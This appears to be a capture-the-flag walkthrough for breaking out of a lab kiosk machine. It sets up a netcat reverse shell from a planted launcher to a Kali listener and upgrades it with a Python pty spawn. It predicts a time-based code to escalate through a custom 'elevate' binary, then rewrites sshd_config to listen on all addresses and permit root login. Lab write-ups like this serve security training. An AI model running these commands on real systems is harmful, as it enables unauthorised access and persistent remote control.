Connect to the kiosk using vncviewer 192.168.88.100:5901 and password 'prisoner'

Create a new launcher shortcut on the panel that'll start nc - see image

Start a listener on Kali VDI
nc -nlvp 4444

Click the launcher in the Kiosk and establish a reverse shell.
For a fully interactive shell, enter:
python -c 'import pty;pty.spawn("/bin/bash")';

Checking for odd binaries reveals
```
/usr/sbin/elevate
```
which is owned by admin

Looking at the binary, there's an interesting function that indicates the security code is calculated based on the time the binary is run. To predict what it will be,
that function can be run as the following which is set for 10 seconds in the future:
```
printf "$(python3 -c 'import time; JAIL_CONSTANT = 0x4A41494C; MODULO = 1000000; local_c = 9; tVar1 = int(time.time()) + 10; print(((local_c + tVar1) * JAIL_CONSTANT) % MODULO)')"
```
then run
```
/usr/sbin/elevate /bin/bash
```
to set the UID to 1000 (admin)



/etc/sshd/sshd_config is wriatable by admin


# Modify the sshd_config file
vi -c '%s/ListenAddress 127.0.0.1/#ListenAddress 127.0.0.1/g' /etc/ssh/sshd_config -c 'wq!'
vi -c '%s/#ListenAddress ::/ListenAddress ::/g' /etc/ssh/sshd_config -c 'wq!'
vi -c '%s/#ListenAddress 0.0.0.0/ListenAddress 0.0.0.0/g' /etc/ssh/sshd_config -c 'wq!'
vi -c '%s/PermitRootLogin without-password/PermitRootLogin yes/g' /etc/ssh/sshd_config -c 'wq!'
